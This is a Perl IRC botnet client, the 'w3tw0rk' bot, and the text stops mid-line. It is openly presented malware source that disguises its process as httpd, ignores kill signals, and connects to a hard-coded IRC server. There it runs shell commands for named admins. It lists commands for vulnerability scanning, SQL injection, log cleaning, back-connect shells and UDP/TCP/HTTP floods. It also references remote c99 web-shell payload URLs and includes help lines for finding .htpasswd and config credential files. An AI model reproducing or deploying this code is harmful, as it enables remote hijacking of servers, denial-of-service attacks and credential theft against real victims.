#!/usr/bin/perl
####################################
# Original Design By Pitbul Modded By w3tw0rk
#-[w3tw0rk B0T Commands List]-
#-----[Hacking Based]-----
# !bot @multiscan <vuln> <dork>
# !bot @socks5
# !bot @sql2 <vuln> <dork> <col>
# !bot @portscan <ip>
# !bot @logcleaner
# !bot @sendmail <subject> <sender> <recipient> <message>
# !bot @system
# !bot @cleartmp
# !bot @rootable
# !bot @nmap <ip> <beginport> <endport>
# !bot @back <ip><port>  
# !bot @linuxhelp
# !bot @cd tmp:. | for example
#-----[Advisory-New Based]-----
# !bot @packetstorm
# !bot @milw0rm
#-----[DDos Based]-----
# !bot @udpflood <host> <packet size> <time>
# !bot @tcpflood <host> <port> <packet size> <time>
# !bot @httpflood <host> <time>
# !bot @sqlflood <host> <time>
#-----[IRC Based]-----
# !bot @killme  
# !bot @join #channel
# !bot @part #channel
# !bot @reset
# !bot @voice <who>
# !bot @owner <who>
# !bot @deowner <who>
# !bot @devoice <who>
# !bot @halfop <who>
# !bot @dehalfop <who>
# !bot @op <who>
# !bot @deop <who>
#-----[Flooding Based]-----
# !bot @msgflood <who>
# !bot @dccflood <who>
# !bot @ctcpflood <who>
# !bot @noticeflood <who>
# !bot @channelflood
# !bot @maxiflood <who>
####################################
use HTTP::Request;
use LWP::UserAgent;
my $processo = 'usr/sbin/httpd';
my $linas_max='10';
my $sleep='5';
my $cmd="http://baseirc.net/stoner/c99.txt???";
my $id="http://www.fileden.com/files/2009/12/5/2676962/ajimbu";
############################################
my @adms=("white","RaYaN`");
my @canais=("#RaYaN");
#Put your channel here
my @nickname = ("BeybonkQuw");
my $nick = $nickname[rand scalar @nickname];
#Nickname of bot 
my $ircname ='RaVaN';
chop (my $realname = 'muach');
#IRC name and Realname 
$servidor='irc.planetwork.us' unless $servidor;
my $porta='7000'; 
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
   if ($#_ == '1') {
      my $socket = $_[0];
      print $socket "$_[1]\n";

   } else {
      print $IRC_cur_socket "$_[0]\n";
   }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
   PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
      $IRC_cur_socket = $IRC_socket;
      $IRC_socket->autoflush(1);
      $sel_cliente->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
      nick("$meunick");
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
      sleep 1;
   }
}

my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
      $IRC_cur_socket = $fh;
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
      $nread = sysread($fh, $msg, 4096);
      if ($nread == 0) {
         $sel_cliente->remove($fh);
         $fh->close;
         delete($irc_servers{$fh});
      }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
         $line = $lines[$c];
         $line=$line_temp.$line if ($line_temp);
         $line_temp='';
         $line =~ s/\r$//;
         unless ($c == $#lines) {
            parse("$line");
         } else {
            if ($#lines == 0) {
               parse("$line");
            } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line"); 
            } else {
               $line_temp = $line;
            }
         }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
      sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
      if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.17 w3tw0rk\001");
      }
      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
         if ($onde eq "$meunick"){
            shell("$pn", "$args");
         }
#End of Connect
         if ($args =~ /^(\Q$meunick\E|\!bot)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
               ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
               $ondep = $onde;
               $ondep = $pn if $onde eq $meunick;
               bfunc("$ondep","$1");
            } else {
               shell("$onde", "$arg");
            }
         }
      }
   }
######################### End of prefix
   elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
      if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
      nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
      $meunick = $2;
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
      foreach my $canal (@canais) {
         sendraw("JOIN $canal $key");
      }
   }
}

sub bfunc {
   my $printl = $_[0];
   my $funcarg = $_[1];
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {

         if ($funcarg =~ /^killme/) {
            sendraw($IRC_cur_socket, "QUIT :");
            $killd = "kill -9 ".fork;
            system (`$killd`);
         }
######################
#                    Commands                      #
######################
         if ($funcarg =~ /^commands/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[w3tw0rk B0T Commands List]-14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[w3tbot/Hacking Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3multiscan <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3socks5");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sql <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3portscan <ip>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3logcleaner");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sendmail <subject> <sender> <recipient> <message>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3system");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cleartmp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3rootable");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3nmap <ip> <beginport> <endport>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cd tmp:. | for example");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3packetstorm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3milw0rm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3udpflood <host> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tcpflood <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>"); 
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sqlflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3killme");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3join #channel");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3part #channel");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3reset");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3voice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3owner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deowner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3devoice <who> ");

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3halfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dehalfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3op <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3msgflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dccflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3ctcpflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3noticeflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3channelflood");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3maxiflood <who> ");
}

         if ($funcarg =~ /^linuxhelp/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Linux Help]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Dir where you are : pwd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Start a Perl file : perl file.pl");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Go back from dir : cd ..");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Force to Remove a file/dir : rm -rf file/dir;ls -la");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Show all files/dir with permissions : ls -lia");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find config.inc.php files : find / -type f -name config.inc.php");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all writable folders and files : find / -perm -2 -ls");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all .htpasswd files : find / -type f -name .htpasswd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Find all service.pwd files : find / -type f -name service.pwd");
         }
         
         if ($funcarg =~ /^help/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Help Commands]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3flooding - For IRC Flooding Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3irc - For IRC Bot Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3ddos - For DDos Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3news - For Security News Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3hacking - For Hacking Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp - For Linux He